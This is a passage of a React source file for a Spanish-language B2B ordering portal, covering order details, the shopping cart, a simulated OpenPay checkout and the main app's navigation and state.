                  <div style={{ flex: 1, height: '2px', backgroundColor: 'var(--status-operative)' }} />
                  <Truck size={20} color="var(--status-operative)" />
                  <div style={{ flex: 1, height: '2px', backgroundColor: 'var(--status-operative)' }} />
                </div>
                <div style={{ textAlign: 'center' }}>
                  <p style={{ margin: '0 0 4px 0', fontSize: '11px', textTransform: 'uppercase', color: 'var(--grey-text)', fontWeight: 700 }}>
                    {order.status === 'Entregado' ? 'Entregado el' : 'Entrega esperada'}
                  </p>
                  <p style={{ margin: 0, fontSize: '14px', fontWeight: 700, color: 'var(--primary-navy)' }}>
                    {order.deliveredDate || order.expectedDelivery}
                  </p>
                </div>
              </div>

              {/* Items */}
              <div style={{ padding: '20px 24px', borderTop: '1px solid var(--grey-border)', backgroundColor: '#fafbfc' }}>
                <p style={{ margin: '0 0 16px 0', fontSize: '12px', fontWeight: 700, textTransform: 'uppercase', color: 'var(--grey-text)' }}>Artículos Pedidos</p>
                <div style={{ display: 'grid', gap: '12px' }}>
                  {order.items.map((item, i) => (
                    <div key={i} style={{ display: 'flex', justifyContent: 'space-between', alignItems: 'center', padding: '10px 12px', backgroundColor: 'white', borderRadius: '8px', border: '1px solid rgba(0,0,0,0.05)' }}>
                      <div style={{ flex: 1 }}>
                        <p style={{ margin: 0, fontSize: '14px', color: 'var(--primary-navy)', fontWeight: 600 }}>{item.name}</p>
                        <p style={{ margin: '4px 0 0 0', fontSize: '12px', color: 'var(--grey-text)' }}>Cantidad: {item.quantity} {item.unit}</p>
                      </div>
                      <div style={{ width: '60px', padding: '6px 12px', backgroundColor: 'var(--bg-slate)', borderRadius: '6px', textAlign: 'center' }}>
                        <p style={{ margin: 0, fontSize: '13px', fontWeight: 700, color: 'var(--status-operative)' }}>×{item.quantity}</p>
                      </div>
                    </div>
                  ))}
                </div>
              </div>

              {/* Actions */}
              <div style={{ padding: '16px 24px', display: 'flex', gap: '12px', justifyContent: 'flex-end', borderTop: '1px solid var(--grey-border)' }}>
                <button
                  onClick={() => setExpandedOrder(expandedOrder === idx ? null : idx)}
                  style={{ padding: '8px 16px', borderRadius: '8px', border: '1px solid var(--accent-blue)', backgroundColor: expandedOrder === idx ? 'var(--accent-blue)' : 'white', color: expandedOrder === idx ? 'white' : 'var(--accent-blue)', cursor: 'pointer', fontSize: '13px', fontWeight: 600, transition: 'all 0.2s', display: 'flex', alignItems: 'center', gap: '6px' }}
                >
                  📄 {expandedOrder === idx ? 'Ocultar Detalles' : 'Ver Detalles'}
                </button>
              </div>

              {/* Expanded Details */}
              {expandedOrder === idx && (
                <div style={{ padding: '20px 24px', borderTop: '1px solid var(--grey-border)', backgroundColor: '#f9fafb', animation: 'fadeIn 0.3s ease' }}>
                  <h4 style={{ margin: '0 0 16px 0', fontSize: '14px', fontWeight: 700, color: 'var(--primary-navy)' }}>📋 Información Completa</h4>
                  
                  <div style={{ display: 'grid', gridTemplateColumns: '1fr 1fr', gap: '16px', marginBottom: '20px' }}>
                    {/* Detalles de Envío */}
                    <div style={{ padding: '12px', backgroundColor: 'white', borderRadius: '8px', border: '1px solid var(--grey-border)' }}>
                      <p style={{ margin: '0 0 8px 0', fontSize: '11px', textTransform: 'uppercase', color: 'var(--grey-text)', fontWeight: 700 }}>Dirección de Entrega</p>
                      <p style={{ margin: '4px 0 0 0', fontSize: '13px', color: 'var(--primary-navy)', fontWeight: 600 }}>México, Ciudad de México</p>
                      <p style={{ margin: '2px 0 0 0', fontSize: '12px', color: 'var(--grey-text)' }}>Domicilio Registrado en Sistema</p>
                    </div>

                    {/* Contacto */}
                    <div style={{ padding: '12px', backgroundColor: 'white', borderRadius: '8px', border: '1px solid var(--grey-border)' }}>
                      <p style={{ margin: '0 0 8px 0', fontSize: '11px', textTransform: 'uppercase', color: 'var(--grey-text)', fontWeight: 700 }}>Contacto de Entrega</p>
                      <p style={{ margin: '4px 0 0 0', fontSize: '13px', color: 'var(--primary-navy)', fontWeight: 600 }}>ebriseno@axtel.com.mx</p>
                      <p style={{ margin: '2px 0 0 0', fontSize: '12px', color: 'var(--grey-text)' }}>+52 55 1234 5678</p>
                    </div>

                    {/* Método de Pago */}
                    <div style={{ padding: '12px', backgroundColor: 'white', borderRadius: '8px', border: '1px solid var(--grey-border)' }}>
                      <p style={{ margin: '0 0 8px 0', fontSize: '11px', textTransform: 'uppercase', color: 'var(--grey-text)', fontWeight: 700 }}>Método de Pago</p>
                      <p style={{ margin: '4px 0 0 0', fontSize: '13px', color: 'var(--primary-navy)', fontWeight: 600 }}>Tarjeta de Crédito</p>
                      <p style={{ margin: '2px 0 0 0', fontSize: '12px', color: 'var(--grey-text)' }}>**** **** **** 4242</p>
                    </div>

                    {/* Notas */}
                    <div style={{ padding: '12px', backgroundColor: 'white', borderRadius: '8px', border: '1px solid var(--grey-border)' }}>
                      <p style={{ margin: '0 0 8px 0', fontSize: '11px', textTransform: 'uppercase', color: 'var(--grey-text)', fontWeight: 700 }}>Instrucciones Especiales</p>
                      <p style={{ margin: '4px 0 0 0', fontSize: '13px', color: 'var(--primary-navy)', fontWeight: 600 }}>Ninguna</p>
                      <p style={{ margin: '2px 0 0 0', fontSize: '12px', color: 'var(--grey-text)' }}>Entrega estándar</p>
                    </div>
                  </div>

                  <div style={{ padding: '12px', backgroundColor: 'rgba(59, 130, 246, 0.05)', borderRadius: '8px', border: '1px solid rgba(59, 130, 246, 0.2)' }}>
                    <p style={{ margin: '0 0 8px 0', fontSize: '12px', fontWeight: 700, color: 'var(--primary-navy)' }}>📞 ¿Necesitas ayuda?</p>
                    <p style={{ margin: 0, fontSize: '12px', color: 'var(--grey-text)' }}>Contacta a nuestro equipo de soporte: soporte@portal.com.mx o +52 55 5678 9012</p>
                  </div>
                </div>
              )}
            </div>
          );
        })}
      </div>
    </div>
  );
};

const CartView = ({ items, onUpdateQty, onRemove, onCheckout, onContinueShopping }) => {
  const total = items.reduce((sum, item) => sum + (item.price * item.quantity), 0);

  if (items.length === 0) {
    return (
      <div style={{ textAlign: 'center', padding: '100px 0' }}>
        <ShoppingCart size={64} style={{ color: 'var(--grey-border)', marginBottom: '24px' }} />
        <h2 style={{ color: 'var(--grey-text)' }}>Tu carrito de distribución está vacío</h2>
        <p style={{ color: 'var(--grey-text)', marginTop: '8px' }}>Explora el catálogo para realizar pedidos industriales.</p>
        <button
          onClick={onContinueShopping}
          style={{
            marginTop: '28px',
            padding: '12px 24px',
            borderRadius: '10px',
            border: '1px solid var(--grey-border)',
            backgroundColor: 'white',
            color: 'var(--primary-navy)',
            cursor: 'pointer',
            fontWeight: 700,
            display: 'inline-flex',
            alignItems: 'center',
            gap: '10px'
          }}
        >
          <ChevronLeft size={16} /> Volver al Catálogo
        </button>
      </div>
    );
  }

  return (
    <div style={{ display: 'grid', gridTemplateColumns: '1fr 340px', gap: '32px', animation: 'fadeIn 0.4s ease' }}>
      <div style={{ backgroundColor: 'white', borderRadius: '12px', border: '1px solid var(--grey-border)', padding: '24px' }}>
        <div style={{ display: 'flex', justifyContent: 'space-between', alignItems: 'center', marginBottom: '24px' }}>
          <button
            onClick={onContinueShopping}
            style={{
              display: 'inline-flex',
              alignItems: 'center',
              gap: '8px',
              background: 'none',
              border: 'none',
              color: 'var(--primary-navy)',
              cursor: 'pointer',
              fontSize: '14px',
              padding: 0
            }}
          >
            <ChevronLeft size={16} /> Seguir comprando
          </button>
          <h3 style={{ margin: 0 }}>Resumen del Pedido</h3>
        </div>
        {items.map(item => (
          <div key={item.id} style={{ display: 'flex', gap: '20px', padding: '16px 0', borderBottom: '1px solid var(--bg-slate)' }}>
            <div style={{ width: '100px', height: '100px', padding: '10px', backgroundColor: '#f8fafc', borderRadius: '8px', display: 'flex', alignItems: 'center', justifyContent: 'center' }}>
              <img src={item.image} style={{ maxWidth: '100%', maxHeight: '100%', objectFit: 'contain' }} alt={item.name} />
            </div>
            <div style={{ flex: 1 }}>
              <h4 style={{ fontSize: '15px' }}>{item.name}</h4>
              <p style={{ fontSize: '12px', color: 'var(--grey-text)' }}>SKU: {item.id} | {item.unit}</p>
              <div style={{ display: 'flex', alignItems: 'center', gap: '24px', marginTop: '12px' }}>
                <div style={{ display: 'flex', alignItems: 'center', gap: '12px', border: '1px solid var(--grey-border)', borderRadius: '6px', padding: '4px' }}>
                  <button onClick={() => onUpdateQty(item.id, -1)} style={{ background: 'none', border: 'none', cursor: 'pointer' }}><Minus size={14} /></button>
                  <span style={{ fontSize: '14px', fontWeight: 600, minWidth: '20px', textAlign: 'center' }}>{item.quantity}</span>
                  <button onClick={() => onUpdateQty(item.id, 1)} style={{ background: 'none', border: 'none', cursor: 'pointer' }}><Plus size={14} /></button>
                </div>
                <button onClick={() => onRemove(item.id)} style={{ background: 'none', border: 'none', color: 'var(--status-stop)', cursor: 'pointer' }}><Trash2 size={16} /></button>
              </div>
            </div>
            <div style={{ textAlign: 'right' }}>
              <p style={{ fontWeight: 700 }}>${(item.price * item.quantity).toFixed(2)} MXN</p>
              <p style={{ fontSize: '11px', color: 'var(--grey-text)' }}>${item.price.toFixed(2)} c/u</p>
            </div>
          </div>
        ))}
      </div>

      <div style={{ backgroundColor: 'var(--primary-navy)', borderRadius: '12px', padding: '32px', color: 'white', height: 'fit-content' }}>
        <h3 style={{ marginBottom: '24px' }}>Resumen de Pedido</h3>
        <div style={{ display: 'flex', justifyContent: 'space-between', marginBottom: '16px' }}>
          <span>Subtotal</span>
          <span>\${total.toFixed(2)} MXN</span>
        </div>
        <div style={{ display: 'flex', justifyContent: 'space-between', marginBottom: '32px', paddingBottom: '16px', borderBottom: '1px solid rgba(255,255,255,0.1)' }}>
          <span>Logística & Envío</span>
          <span style={{ color: 'var(--status-operative)', fontWeight: 600 }}>GRATIS</span>
        </div>
        <div style={{ display: 'flex', justifyContent: 'space-between', marginBottom: '32px', fontSize: '20px', fontWeight: 700 }}>
          <span>Total Est.</span>
          <span>${total.toFixed(2)} MXN</span>
        </div>
        <button
          onClick={onCheckout}
          style={{
            width: '100%',
            padding: '16px',
            backgroundColor: 'var(--accent-blue)',
            color: 'white',
            border: 'none',
            borderRadius: '8px',
            fontWeight: 700,
            cursor: 'pointer',
            display: 'flex',
            alignItems: 'center',
            justifyContent: 'center',
            gap: '12px',
            transition: 'all 0.2s ease'
          }}
        >
          Ir al Pago con OpenPay <ArrowRight size={18} />
        </button>
        <div style={{ marginTop: '24px', textAlign: 'center' }}>
          <img src="https://js.openpay.mx/openpay_logo.png" style={{ height: '30px', filter: 'brightness(10)' }} alt="OpenPay Secure" />
        </div>
      </div>
    </div>
  );
};

const OpenPayView = ({ total, onPaymentComplete, onCancel }) => {
  const [method, setMethod] = useState('card'); // 'card', 'bank', 'store'
  const [loading, setLoading] = useState(false);
  const [error, setError] = useState('');

  const [cardName, setCardName] = useState('');
  const [cardNumber, setCardNumber] = useState('');
  const [cardExpiry, setCardExpiry] = useState('');
  const [cardCvv, setCardCvv] = useState('');

  const handlePay = () => {
    // Prevent payment if required form fields are empty
    if (method === 'card') {
      if (!cardName.trim() || !cardNumber.trim() || !cardExpiry.trim() || !cardCvv.trim()) {
        setError('Completa todos los campos de tarjeta para continuar.');
        return;
      }
    }



    setError('');
    setLoading(true);
    setTimeout(() => {
      setLoading(false);
      onPaymentComplete();
    }, 2500);
  };

  const renderCardForm = () => (
    <div style={{ display: 'grid', gap: '20px', animation: 'fadeIn 0.3s ease' }}>
      <div style={{ display: 'grid', gap: '8px' }}>
        <label style={{ fontSize: '13px', fontWeight: 600, color: 'var(--primary-navy)' }}>Nombre en la tarjeta</label>
        <input
          value={cardName}
          onChange={(e) => setCardName(e.target.value)}
          type="text"
          placeholder="Como aparece en la tarjeta"
          style={{ padding: '12px', borderRadius: '8px', border: '1px solid var(--grey-border)', fontSize: '14px' }}
        />
      </div>
      <div style={{ display: 'grid', gap: '8px' }}>
        <label style={{ fontSize: '13px', fontWeight: 600, color: 'var(--primary-navy)' }}>Número de tarjeta</label>
        <div style={{ position: 'relative' }}>
          <input
            value={cardNumber}
            onChange={(e) => setCardNumber(e.target.value)}
            type="text"
            placeholder="0000 0000 0000 0000"
            style={{ padding: '12px 12px 12px 48px', borderRadius: '8px', border: '1px solid var(--grey-border)', fontSize: '14px', width: '100%', boxSizing: 'border-box' }}
          />
          <CardIcon size={18} style={{ position: 'absolute', left: '16px', top: '50%', transform: 'translateY(-50%)', color: 'var(--grey-text)' }} />
        </div>
      </div>
      <div style={{ display: 'grid', gridTemplateColumns: '1fr 1fr', gap: '16px' }}>
        <div style={{ display: 'grid', gap: '8px' }}>
          <label style={{ fontSize: '13px', fontWeight: 600, color: 'var(--primary-navy)' }}>Fecha de expiración</label>
          <input
            value={cardExpiry}
            onChange={(e) => setCardExpiry(e.target.value)}
            type="text"
            placeholder="MM/AA"
            style={{ padding: '12px', borderRadius: '8px', border: '1px solid var(--grey-border)', fontSize: '14px' }}
          />
        </div>
        <div style={{ display: 'grid', gap: '8px' }}>
          <label style={{ fontSize: '13px', fontWeight: 600, color: 'var(--primary-navy)' }}>CVV</label>
          <div style={{ position: 'relative' }}>
            <input
              value={cardCvv}
              onChange={(e) => setCardCvv(e.target.value)}
              type="text"
              placeholder="123"
              style={{ padding: '12px', borderRadius: '8px', border: '1px solid var(--grey-border)', fontSize: '14px', width: '100%', boxSizing: 'border-box' }}
            />
            <Lock size={16} style={{ position: 'absolute', right: '16px', top: '50%', transform: 'translateY(-50%)', color: 'var(--grey-text)' }} />
          </div>
        </div>
      </div>
      <div style={{ display: 'flex', alignItems: 'center', gap: '20px', marginTop: '10px' }}>
         <img src="https://img.icons8.com/color/48/000000/visa.png" width="40" alt="Visa" />
         <img src="https://img.icons8.com/color/48/000000/mastercard.png" width="40" alt="Mastercard" />
         <img src="https://img.icons8.com/color/48/000000/amex.png" width="40" alt="Amex" />
      </div>
    </div>
  );

  const renderBankTransfer = () => (
    <div style={{ padding: '20px', backgroundColor: '#f8fafc', borderRadius: '12px', border: '1px solid #e2e8f0', animation: 'fadeIn 0.3s ease' }}>
      <div style={{ display: 'flex', alignItems: 'center', gap: '12px', marginBottom: '16px' }}>
        <Building2 size={24} color="#3b82f6" />
        <h4 style={{ margin: 0 }}>Transferencia Interbancaria (SPEI)</h4>
      </div>
      <p style={{ fontSize: '14px', color: '#64748b', marginBottom: '20px' }}>Se generará una referencia CLABE única para que realices tu pago desde tu banca electrónica.</p>
      <div style={{ backgroundColor: 'white', padding: '16px', borderRadius: '8px', border: '1px dashed #cbd5e1' }}>
        <p style={{ fontSize: '12px', color: '#94a3b8', margin: '0 0 4px 0' }}>Beneficiario</p>
        <p style={{ fontWeight: 700, margin: '0 0 12px 0' }}>&lt;nombre_razon_social&gt;</p>
        <p style={{ fontSize: '12px', color: '#94a3b8', margin: '0 0 4px 0' }}>CLABE</p>
        <p style={{ fontWeight: 700, fontSize: '18px', letterSpacing: '2px', margin: 0 }}>0000 0000 0000 0000 00</p>
      </div>
    </div>
  );

  return (
    <div style={{ maxWidth: '800px', margin: '0 auto', animation: 'fadeIn 0.5s ease' }}>
      <div style={{ display: 'flex', alignItems: 'center', justifyContent: 'space-between', marginBottom: '32px' }}>
        <div>
          <button 
            onClick={onCancel}
            style={{ display: 'flex', alignItems: 'center', gap: '8px', background: 'none', border: 'none', color: 'var(--grey-text)', cursor: 'pointer', fontSize: '14px', padding: 0, marginBottom: '8px' }}
          >
            <ChevronLeft size={16} /> Volver al carrito
          </button>
          <h2 style={{ fontSize: '32px', fontWeight: 800, color: 'var(--primary-navy)' }}>Finalizar Compra</h2>
        </div>
        <div style={{ textAlign: 'right' }}>
          <img src="https://js.openpay.mx/openpay_logo.png" alt="OpenPay" style={{ height: '35px', marginBottom: '4px' }} />
          <p style={{ fontSize: '11px', color: 'var(--grey-text)' }}>Transacción segura por OpenPay</p>
        </div>
      </div>

      <div style={{ display: 'grid', gridTemplateColumns: '1fr 320px', gap: '32px' }}>
        <div style={{ backgroundColor: 'white', borderRadius: '16px', padding: '32px', boxShadow: '0 4px 20px rgba(0,0,0,0.05)', border: '1px solid var(--grey-border)' }}>
          <h3 style={{ fontSize: '18px', marginBottom: '24px' }}>Método de Pago</h3>
          
          <div style={{ display: 'grid', gridTemplateColumns: '1fr 1fr 1fr', gap: '12px', marginBottom: '32px' }}>
            {[
              { id: 'card', label: 'Tarjeta', icon: <CardIcon size={20} /> },
              { id: 'bank', label: 'SPEI', icon: <Building2 size={20} /> },
              { id: 'store', label: 'Efectivo', icon: <Smartphone size={20} /> }
            ].map(m => (
              <button
                key={m.id}
                onClick={() => setMethod(m.id)}
                style={{
                  display: 'flex',
                  flexDirection: 'column',
                  alignItems: 'center',
                  gap: '8px',
                  padding: '16px',
                  borderRadius: '12px',
                  border: method === m.id ? '2px solid #3b82f6' : '1px solid var(--grey-border)',
                  backgroundColor: method === m.id ? '#eff6ff' : 'white',
                  cursor: 'pointer',
                  transition: 'all 0.2s ease',
                  color: method === m.id ? '#1e40af' : 'var(--grey-text)'
                }}
              >
                {m.icon}
                <span style={{ fontSize: '13px', fontWeight: 600 }}>{m.label}</span>
              </button>
            ))}
          </div>

          {method === 'card' ? renderCardForm() : renderBankTransfer()}

          <div style={{ marginTop: '32px', display: 'flex', alignItems: 'center', gap: '12px', padding: '16px', backgroundColor: '#fffbeb', borderRadius: '8px', border: '1px solid #fde68a' }}>
            <AlertCircle size={20} color="#b45309" />
            <p style={{ fontSize: '13px', color: '#92400e', margin: 0 }}>
              Sus datos son procesados de forma segura por OpenPay de BBVA.
            </p>
          </div>
        </div>

        <div>
          <div style={{ backgroundColor: 'white', borderRadius: '16px', padding: '24px', position: 'sticky', top: '24px', border: '1px solid var(--grey-border)' }}>
            <h3 style={{ fontSize: '16px', marginBottom: '20px' }}>Resumen</h3>
            <div style={{ display: 'grid', gap: '12px', marginBottom: '20px', paddingBottom: '20px', borderBottom: '1px solid var(--bg-slate)' }}>
              <div style={{ display: 'flex', justifyContent: 'space-between', fontSize: '14px' }}>
                <span style={{ color: 'var(--grey-text)' }}>Subtotal</span>
                <span>${total.toLocaleString()} MXN</span>
              </div>
              <div style={{ display: 'flex', justifyContent: 'space-between', fontSize: '14px' }}>
                <span style={{ color: 'var(--grey-text)' }}>IVA (16%)</span>
                <span>${(total * 0.16).toLocaleString()} MXN</span>
              </div>
            </div>
            <div style={{ display: 'flex', justifyContent: 'space-between', fontSize: '20px', fontWeight: 800, marginBottom: '24px', color: 'var(--primary-navy)' }}>
              <span>Total</span>
              <span>${(total * 1.16).toLocaleString()} MXN</span>
            </div>
            
            {error && (
              <div style={{ marginBottom: '16px', padding: '12px 14px', backgroundColor: 'rgba(248, 113, 113, 0.15)', border: '1px solid rgba(248, 113, 113, 0.35)', borderRadius: '10px', color: '#b91c1c', fontSize: '14px' }}>
                {error}
              </div>
            )}

            <button
              onClick={handlePay}
              disabled={loading}
              style={{
                width: '100%',
                padding: '16px',
                backgroundColor: '#3b82f6',
                color: 'white',
                border: 'none',
                borderRadius: '12px',
                fontSize: '16px',
                fontWeight: 700,
                cursor: loading ? 'not-allowed' : 'pointer',
                display: 'flex',
                alignItems: 'center',
                justifyContent: 'center',
                gap: '12px',
                transition: 'all 0.2s ease',
                boxShadow: '0 4px 12px rgba(59, 130, 246, 0.3)'
              }}
            >
              {loading ? (
                <>Procesando...</>
              ) : (
                <>Pagar Ahora <Lock size={18} /></>
              )}
            </button>
          </div>
        </div>
      </div>
    </div>
  );
};

// --- MAIN APP ---

const App = () => {
  const [user, setUser] = useState({
    name: 'Usuario30891',
    role: 'Compras Corporativas',
    email: 'ebriseno@axtel.com.mx',
    creditLimit: 500000,
    balance: 125400
  });
  const [view, setView] = useState(() => window.history.state?.view || 'home');
  const [isSidebarOpen, setIsSidebarOpen] = useState(false);
  const [products, setProducts] = useState([]);
  const [cart, setCart] = useState(() => {
    const saved = localStorage.getItem('portal_cart');
    return saved ? JSON.parse(saved) : [];
  });
  const [orderPlaced, setOrderPlaced] = useState(false);
  const [toast, setToast] = useState({ message: '', visible: false });
  const [searchTerm, setSearchTerm] = useState('');

  const showNotification = (message) => {
    setToast({ message, visible: true });
    setTimeout(() => setToast({ message: '', visible: false }), 3000);
  };

  // Sync with Browser History (Back/Forward buttons)
  useEffect(() => {
    const handlePopState = (event) => {
      if (event.state && event.state.view) {
        setView(event.state.view);
        setOrderPlaced(false);
      } else {
        setView('home');
      }
    };
    window.addEventListener('popstate', handlePopState);
    return () => window.removeEventListener('popstate', handlePopState);
  }, []);

  const handleViewChange = (newView) => {
    setView(newView);
    setOrderPlaced(false);
    window.history.pushState({ view: newView }, '', '');
  };

  useEffect(() => {
    localStorage.setItem('portal_cart', JSON.stringify(cart));
  }, [cart]);

  useEffect(() => {
    if (user) {
      fetch(`${API_URL}/products`)
        .then(res => res.json())
        .then(data => {
          if (searchTerm) {
            const lowSearch = searchTerm.toLowerCase();
            setProducts(data.filter(p =>
              p.name.toLowerCase().includes(lowSearch) ||
              p.id.toLowerCase().includes(lowSearch)
            ));
          } else {
            setProducts(data);
          }
        });
    }
  }, [user, searchTerm]);

  const addToCart = (product) => {
    setCart(prev => {
      return [...prev, { ...product, quantity: 1 }];
    });
    showNotification(`Producto añadido: ${product.name}`);
  };

  const updateCartQty = (id, delta) => {
    setCart(prev => {
      const item = prev.find(i => i.id === id);
      if (!item) return prev;

      const nextQty = item.quantity + delta;

      if (nextQty <= 0) {
        showNotification(`Producto eliminado: ${item.name}`);
        return prev.filter(i => i.id !== id);
      }

      if (delta > 0) showNotification(`Cantidad aumentada a ${nextQty}`);
      else showNotification(`Cantidad reducida a ${nextQty}`);

      return prev.map(i => i.id === id ? { ...i, quantity: nextQty } : i);
    });
  };

  const removeFromCart = (id) => {
    setCart(prev => prev.filter(item => item.id !== id));
  };

  if (!user) return <Login onLogin={setUser} />;

  const renderContent = () => {
    if (orderPlaced) {
      return (
        <div style={{ textAlign: 'center', padding: '100px 0', animation: 'fadeIn 0.4s ease' }}>
          <CheckCircle2 size={80} style={{ color: 'var(--status-operative)', marginBottom: '24px' }} />
          <h2 style={{ fontSize: '32px', marginBottom: '16px' }}>¡Orden Recibida con Éxito!</h2>
          <p style={{ color: 'var(--grey-text)', fontSize: '18px', maxWidth: '600px', margin: '0 auto' }}>
            Tu solicitud de pedido para <b>Portal</b> ha sido enviada a facturación y planeación.
            Recibirás el protocolo de logística en tu email de corporativo.
          </p>
          <button
            onClick={() => { setOrderPlaced(false); setCart([]); handleViewChange('home'); }}
            style={{ marginTop: '48px', padding: '16px 32px', backgroundColor: 'var(--primary-navy)', color: 'white', border: 'none', borderRadius: '8px', cursor: 'pointer', fontWeight: 700 }}
          >
            Regresar al Inicio
          </button>
        </div>
      );
    }

    switch (view) {
      case 'home': return <HomeDashboard user={user} onViewChange={handleViewChange} />;
      case 'b2b': return <CatalogView products={products} onAddToCart={addToCart} onUpdateQty={updateCartQty} cart={cart} searchTerm={searchTerm} onSearchChange={setSearchTerm} />;
      case 'cart': return <CartView items={cart} onUpdateQty={updateCartQty} onRemove={removeFromCart} onCheckout={() => handleViewChange('payment')} onContinueShopping={() => handleViewChange('b2b')} />;
      case 'payment': return <OpenPayView total={cart.reduce((s, i) => s + i.price * i.quantity, 0)} onPaymentComplete={() => setOrderPlaced(true)} onCancel={() => handleViewChange('cart')} />;
      case 'account': return <AccountStatement user={user} />;
      case 'promos': return <PromotionsView />;
      case 'billing': return <BillingView />;
      case 'orders': return <OrdersView />;
      default: return null;
    }
  };

  return (
    <div style={{ height: '100vh', display: 'flex', flexDirection: 'column', overflow: 'hidden' }}>
      <Topbar
        user={user}
        onViewChange={handleViewChange}
        cartCount={cart.reduce((s, i) => s + i.quantity, 0)}
        onLogout={() => setUser(null)}
        onToggleSidebar={() => setIsSidebarOpen(!isSidebarOpen)}
      />
      <div style={{ display: 'flex', flex: 1, position: 'relative', minHeight: 0 }}>
        <Sidebar
          currentView={view}
          onViewChange={handleViewChange}
          isOpen={isSidebarOpen}
          onClose={() => setIsSidebarOpen(false)}
          onLogout={() => setUser(null)}
        />

        {/* Overlay when sidebar is open */}
        {isSidebarOpen && (
          <div
            onClick={() => setIsSidebarOpen(false)}
            style={{
              position: 'fixed',
              top: 0,
              left: 0,
              right: 0,
              bottom: 0,
              backgroundColor: 'rgba(0,0,0,0.3)',
              zIndex: 999,
              backdropFilter: 'blur(2px)'
            }}
          />
        )}

        <main style={{
          flex: 1,
          padding: '40px',
          overflowY: 'auto',
          backgroundColor: 'var(--bg-slate)'
        }}>
          {renderContent()}
        </main>
      </div>

      <footer style={{
        backgroundColor: 'var(--primary-navy)',
        borderTop: '1px solid rgba(255,255,255,0.1)',
        padding: '16px 40px',
        display: 'flex',
        justifyContent: 'space-between',
        alignItems: 'center',
        zIndex: 10,
        color: 'white'
      }}>
        <div style={{ display: 'flex', alignItems: 'center', gap: '8px' }}>
          <div style={{ width: '24px', height: '24px', backgroundColor: 'white', borderRadius: '4px', overflow: 'hidden', border: '1px solid var(--grey-border)', display: 'flex', alignItems: 'center', justifyContent: 'center' }}>
            <img src="/logo.png" alt="Logo" style={{ width: '90%', height: '90%', objectFit: 'contain' }} />
          </div>
          <span style={{ fontWeight: 800, fontSize: '14px', letterSpacing: '0.05em', color: 'white' }}>Portal</span>
        </div>
        <p style={{ fontSize: '13px', color: 'rgba(255,255,255,0.6)' }}>
          © 2026 Portal Distribution Hub. Todos los derechos reservados.
        </p>
      </footer>

      {/* Instant Notification (Toast) */}
      {toast.visible && (
        <div style={{
          position: 'fixed',
          bottom: '100px',
          left: '50%',
          transform: 'translateX(-50%)',
          backgroundColor: 'var(--primary-navy)',
          color: 'white',
          padding: '16px 32px',
          borderRadius: '100px',
          boxShadow: '0 10px 30px rgba(0,0,0,0.3)',
          display: 'flex',
          alignItems: 'center',
          gap: '12px',
          zIndex: 9999,
          animation: 'fadeIn 0.3s ease',
          fontWeight: 600,
          border: '1px solid rgba(255,255,255,0.1)'
        }}>
          <CheckCircle2 size={20} color="var(--status-operative)" />
          {toast.message}
        </div>
      )}
    </div>
  );
};

export default App;
